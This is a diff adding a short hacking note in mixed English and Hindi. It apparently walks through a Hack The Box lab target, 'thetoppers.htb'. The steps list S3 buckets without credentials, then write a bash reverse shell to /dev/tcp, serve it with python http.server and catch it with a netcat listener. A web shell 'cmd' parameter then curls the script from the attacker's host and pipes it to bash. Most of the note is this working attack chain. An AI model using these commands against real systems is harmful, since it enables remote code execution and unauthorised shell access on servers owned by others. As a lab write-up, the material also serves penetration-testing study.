@@ -1,0 +1,59 @@
+
+# AWS
+
+##Technical Guftguuuuu 
+
+cc is on demand delivery of computing power, database, storage, application and other IT resource through a cloud service platform via the internet with pay as you go pricing model 
+
+
+
+## How to hack a full sub domain which is hosted in AWS S3 bucket .... 
+
+aws s3 ls http://s3.thetoppers.htb/ --no-sign-request
+
+We can list all of the S3 buckets hosted by the server by using the ls command.
+
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+
+We can also use the ls command to list objects and common prefixes under the specified bucket.
+
+aws configure
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+RCE ——> 
+pehle ek bash file bnan na hai 
+usme ye likhna hai
+
+#!/bin/bash
+bash -i >& /dev/tcp/{your ip}/{port} 0>&1
+
+isko saave kar dena hai shell.sh naam se
+
+uske baad iss file ko host karna hai 
+
+python3 -m http.server 8000
+
+iss comand ke maddad se host kar sakte hai
+
+
+abb hack karne se pehle aaplogo ko ek dommy server ko sunne ke liye tyer pekr ke rakhna honga 
+
+uske liye ye command hai 
+
+nc -nvlp 1337 (ye local machin tyarr ho gya koi v connection pakdne ke liye)
+
+abb jo wo bash file tha uska url nikalna hai ,, to wahi url ko le kr 
+
+s3.the http://10.129.6.58/shell.php?cmd=[curl ] + {yha pe dall dena hai ex-> 0.0.0.0/Download/shell.sh} + [ |bash ]
+
+We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash in order to execute it.
+
+jese hi execute honga 
+
+weae hi hamra lisning sever pe ye connection request vez denga 
+
+,,, aur humara natcat isko aaasani se pakad ke connection stablish kr lenga 
+
+
+
+:) happy :) Hacking 
